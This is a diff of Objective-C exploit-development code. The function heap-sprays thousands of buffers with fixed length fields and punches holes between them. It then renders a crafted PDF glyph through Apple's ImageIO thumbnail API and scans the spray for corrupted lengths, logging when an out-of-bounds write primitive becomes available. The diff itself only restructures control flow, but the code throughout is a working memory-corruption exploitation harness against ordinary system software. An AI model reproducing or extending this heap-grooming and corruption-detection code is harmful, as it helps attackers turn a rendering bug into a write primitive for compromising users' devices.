@@ -1247,7 +1247,7 @@ static void kpGlyphSegvAll(int sig) {
     void (*oldabrt)(int) = signal(SIGABRT, kpGlyphSegvAll);
 
     if (sigsetjmp(kpGlyphJmp, 1) != 0) {
-        scopeNote(r, @"  *** CAUGHT SIGNAL — aborted early, reporting partial results ***");
+        scopeNote(r, @"  *** CAUGHT SIGNAL — aborted early ***");
         signal(SIGSEGV, oldsegv ? oldsegv : SIG_DFL);
         signal(SIGBUS,  oldbus  ? oldbus  : SIG_DFL);
         signal(SIGABRT, oldabrt ? oldabrt : SIG_DFL);
@@ -1256,92 +1256,94 @@ static void kpGlyphSegvAll(int sig) {
 
     enum { NBUFS = 4096 };
     void **bufs = calloc(NBUFS, sizeof(void *));
-    if (!bufs) { scopeNote(r, @"calloc fail"); goto out; }
-    int got = 0, holes = 0;
-
-    // Fill with u32 length fields (0x100 every 4 bytes)
-    for (int i = 0; i < NBUFS; i++) {
-        void *b = malloc(spraySz);
-        if (!b) break;
-        uint32_t *p = (uint32_t *)b;
-        size_t n = spraySz / 4;
-        for (size_t j = 0; j < n; j++) p[j] = 0x00000100;
-        *(uint64_t *)((uint8_t *)b + spraySz - 8) = (uint64_t)i;
-        bufs[i] = b;
-        got++;
-    }
-    for (int i = 1; i < got; i += 2) { free(bufs[i]); bufs[i] = NULL; holes++; }
-    int live = got - holes;
-    scopeNote(r, [NSString stringWithFormat:
-                  @"  sprayed %d bufs x %zu (u32 len=0x100)  [live=%d holes=%d]",
-                  got, spraySz, live, holes]);
-
-    // ---- render ----
-    NSString *path = [[NSBundle mainBundle] pathForResource:vname ofType:@"pdf"];
-    if (path) {
-        NSURL *url = [NSURL fileURLWithPath:path];
-        CGImageSourceRef src = CGImageSourceCreateWithURL((__bridge CFURLRef)url, NULL);
-        if (src) {
-            int sz = 256;
-            CFNumberRef szRef = CFNumberCreate(NULL, kCFNumberIntType, &sz);
-            const void *keys[] = { kCGImageSourceCreateThumbnailFromImageAlways,
-                                   kCGImageSourceThumbnailMaxPixelSize };
-            const void *vals[] = { kCFBooleanTrue, szRef };
-            CFDictionaryRef opts = CFDictionaryCreate(NULL, keys, vals, 2,
-                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-            scopeNote(r, @"  rendering glyph…");
-            CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);
-            scopeNote(r, [NSString stringWithFormat:@"  SURVIVED. img=%p", (void *)img]);
-            if (img) CGImageRelease(img);
-            CFRelease(opts); CFRelease(szRef); CFRelease(src);
-        }
-    }
-
-    // ---- scan for corrupted u32 length fields ----
-    [r appendString:@"\n--- u32 length scan ---\n"];
+    int got = 0, holes = 0, live = 0;
     int hits = 0, grew = 0, shrank = 0;
     int firstIdx = -1;
     size_t firstOff = 0;
     uint32_t firstLen = 0;
-    size_t scanLen = (spraySz > 8) ? spraySz - 8 : spraySz;
+    size_t scanLen = 0;
 
-    for (int i = 0; i < got; i += 2) {
-        uint8_t *b = bufs[i];
-        if (!b) continue;
-        // Validate pointer looks sane (not obviously corrupted)
-        if ((uintptr_t)b < 0x1000) continue;
-        uint32_t *p = (uint32_t *)b;
-        for (size_t o = 0; o + 3 < scanLen; o += 4) {
-            uint32_t len = p[o / 4];
-            if (len == 0x100) continue;
-            hits++;
-            int delta = (int)len - (int)0x100;
-            if (delta > 0) grew++; else shrank++;
-            if (firstIdx < 0) { firstIdx = i; firstOff = o; firstLen = len; }
-            if (hits <= 10) {
+    if (!bufs) {
+        scopeNote(r, @"calloc fail");
+    } else {
+        // Fill with u32 length fields (0x100 every 4 bytes)
+        for (int i = 0; i < NBUFS; i++) {
+            void *b = malloc(spraySz);
+            if (!b) break;
+            uint32_t *p = (uint32_t *)b;
+            size_t n = spraySz / 4;
+            for (size_t j = 0; j < n; j++) p[j] = 0x00000100;
+            *(uint64_t *)((uint8_t *)b + spraySz - 8) = (uint64_t)i;
+            bufs[i] = b;
+            got++;
+        }
+        for (int i = 1; i < got; i += 2) { free(bufs[i]); bufs[i] = NULL; holes++; }
+        live = got - holes;
+        scopeNote(r, [NSString stringWithFormat:
+                      @"  sprayed %d bufs x %zu (u32 len=0x100)  [live=%d holes=%d]",
+                      got, spraySz, live, holes]);
+
+        // ---- render ----
+        NSString *path = [[NSBundle mainBundle] pathForResource:vname ofType:@"pdf"];
+        if (path) {
+            NSURL *url = [NSURL fileURLWithPath:path];
+            CGImageSourceRef src = CGImageSourceCreateWithURL((__bridge CFURLRef)url, NULL);
+            if (src) {
+                int sz = 256;
+                CFNumberRef szRef = CFNumberCreate(NULL, kCFNumberIntType, &sz);
+                const void *keys[] = { kCGImageSourceCreateThumbnailFromImageAlways,
+                                       kCGImageSourceThumbnailMaxPixelSize };
+                const void *vals[] = { kCFBooleanTrue, szRef };
+                CFDictionaryRef opts = CFDictionaryCreate(NULL, keys, vals, 2,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                scopeNote(r, @"  rendering glyph…");
+                CGImageRef img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);
+                scopeNote(r, [NSString stringWithFormat:@"  SURVIVED. img=%p", (void *)img]);
+                if (img) CGImageRelease(img);
+                CFRelease(opts); CFRelease(szRef); CFRelease(src);
+            }
+        }
+
+        // ---- scan for corrupted u32 length fields ----
+        [r appendString:@"\n--- u32 length scan ---\n"];
+        scanLen = (spraySz > 8) ? spraySz - 8 : spraySz;
+
+        for (int i = 0; i < got; i += 2) {
+            uint8_t *b = bufs[i];
+            if (!b) continue;
+            if ((uintptr_t)b < 0x1000) continue;
+            uint32_t *p = (uint32_t *)b;
+            for (size_t o = 0; o + 3 < scanLen; o += 4) {
+                uint32_t len = p[o / 4];
+                if (len == 0x100) continue;
+                hits++;
+                int delta = (int)len - (int)0x100;
+                if (delta > 0) grew++; else shrank++;
+                if (firstIdx < 0) { firstIdx = i; firstOff = o; firstLen = len; }
+                if (hits <= 10) {
+                    scopeNote(r, [NSString stringWithFormat:
+                        @"  LEN HIT buf %d off=%zu  u32: 0x00000100->0x%08x  delta=%+d%s",
+                        i, o, len, delta,
+                        (delta > 0) ? "  [GROWN — OOB!]" : "  [shrunk]"]);
+                }
+            }
+        }
+        scopeNote(r, [NSString stringWithFormat:
+            @"  VERIFY LEN_HIT=%d GREW=%d SHRANK=%d FIRST=(buf %d off %zu) len=0x%x VARIANT=%s",
+            hits > 0, grew, shrank, firstIdx, firstOff, firstLen, vname.UTF8String]);
+
+        if (hits == 0) {
+            scopeNote(r, @"  no u32 length changed.");
+        } else {
+            scopeNote(r, [NSString stringWithFormat:@"  >>> %d length hit(s): +%d grew / %d shrank", hits, grew, shrank]);
+            if (grew > 0) {
                 scopeNote(r, [NSString stringWithFormat:
-                    @"  LEN HIT buf %d off=%zu  u32: 0x00000100->0x%08x  delta=%+d%s",
-                    i, o, len, delta,
-                    (delta > 0) ? "  [GROWN — OOB!]" : "  [shrunk]"]);
+                    @"  >>> OOB WRITE AVAILABLE: grown length 0x%x (was 0x100) — copy %u bytes past 0x100 boundary",
+                    firstLen, firstLen > 0x100 ? firstLen - 0x100 : 0]);
             }
         }
     }
-    scopeNote(r, [NSString stringWithFormat:
-        @"  VERIFY LEN_HIT=%d GREW=%d SHRANK=%d FIRST=(buf %d off %zu) len=0x%x VARIANT=%s",
-        hits > 0, grew, shrank, firstIdx, firstOff, firstLen, vname.UTF8String]);
 
-    if (hits == 0) {
-        scopeNote(r, @"  no u32 length changed.");
-    } else {
-        scopeNote(r, [NSString stringWithFormat:@"  >>> %d length hit(s): +%d grew / %d shrank", hits, grew, shrank]);
-        if (grew > 0) {
-            scopeNote(r, [NSString stringWithFormat:
-                @"  >>> OOB WRITE AVAILABLE: grown length 0x%x (was 0x100) — copy %u bytes past 0x100 boundary",
-                firstLen, firstLen > 0x100 ? firstLen - 0x100 : 0]);
-        }
-    }
-
-out:
     // NEVER free — heap may be corrupted by OOB walk.
     signal(SIGSEGV, oldsegv ? oldsegv : SIG_DFL);
     signal(SIGBUS,  oldbus  ? oldbus  : SIG_DFL);
